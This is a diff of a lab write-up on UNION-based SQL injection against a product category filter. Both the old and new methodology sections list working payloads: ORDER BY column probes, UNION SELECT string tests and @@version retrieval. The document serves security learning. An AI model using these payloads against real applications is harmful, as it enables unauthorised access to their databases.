@@ -17,18 +17,21 @@ The applications product category filter builds its SQL query by directly concat
 Because user input is placed inside the query, an attacker can append a "UNION SELECT" clause to retrieve data that is not normally returned, such as the database version.
 
 # Methodology
-1. Opened the lab and clicked a category filter called Gifts. The URL became "/filter?category=Gifts".
-2. Determined the query returns 2 columns using the "ORDER BY" technique 
- "/filter?category=Gifts'+ORDER+BY+1--",  
- "/filter?category=Gifts'+ORDER+BY+2--"
-3. Confirmed which columns accept text by injecting a UNION SELECT with string values using payload 
- "/filter?category=Gifts'+UNION+SELECT+'a','a'--"
-4. Retrieved the database version using "@@version", which both MySQL and Microsoft SQL Server supports using payload 
- "/filter?category=Gifts'+UNION+SELECT+@@version,NULL--"
-5. On MySQL, comment syntax differs slightly since "--" requires a trailing space, so "#" was used instead where needed 
- "/filter?category=Gifts'+UNION+SELECT+@@version,NULL#"
-6. The page displayed the database version string as "Microsoft SQL Server 2019..." or "8.0.x-MySQL" in place of a product, confirming the injection worked and the lab was marked as solved.
-
+1. Accessed the lab and connected Burp to the browser.
+2. Navigated to the Accessories page and captured the request in Burp's HTTP history. Sent it to Repeater.
+3. Determined the number of columns using ORDER BY, injected into the GET request's category parameter:
+- 'ORDER BY 1--  → 200 OK
+- 'ORDER BY 2--  → 200 OK
+- 'ORDER BY 3--  → 500 Internal Server Error
+-  confirms the query returns exactly 2 columns.
+5. Tested which columns accept string data, injecting into the  GET request headers:
+   'UNION SELECT 'a',NULL#
+   → 200 OK response, confirming column 1 accepts text.
+6. Retrieved the database version:
+   'UNION SELECT @@version,NULL#
+   →200 ok response with version as 8.0.42 in burp.
+   And you see the lab was solved.
+   
 # Evidence
 ![UNION SELECT payload retrieving database version](images/lab-04-payload.png)
 ![Lab solved](images/lab-04-solved.png)
